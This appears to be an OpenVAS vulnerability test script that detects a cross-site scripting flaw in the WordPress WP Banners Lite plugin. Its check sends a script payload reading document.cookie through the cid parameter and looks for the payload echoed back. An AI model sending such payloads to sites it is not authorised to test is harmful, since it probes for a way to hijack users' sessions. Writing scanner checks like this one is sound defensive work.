###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_banners_lite_xss_vuln.nasl 11620 2018-09-26 09:10:24Z asteins $
#
# Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
arbitrary HTML or web script in a user's browser session in context of an
affected site.");
  script_tag(name:"affected", value:"Wordpress WP Banners Lite Plugin version 1.40 and prior");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input to
the wpbanners_show.php script via cid parameter.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with Wordpress WP Banners Lite Plugin and
is prone to xss vulnerability.");
  script_oid("1.3.6.1.4.1.25623.1.0.803450");
  script_version("$Revision: 11620 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-26 11:10:24 +0200 (Wed, 26 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-03-26 15:56:32 +0530 (Tue, 26 Mar 2013)");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_name("Wordpress WP Banners Lite Plugin Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120928");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Mar/209");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wp-banners-lite-140-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

CPE = 'cpe:/a:wordpress:wordpress';

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/wp-banners-lite/wpbanners_show.php?"+
                "id=1&cid=a_<script>alert(document.cookie);</script>";

if(http_vuln_check(port:port, url:url,
        pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE))
{
  security_message(port);
  exit(0);
}
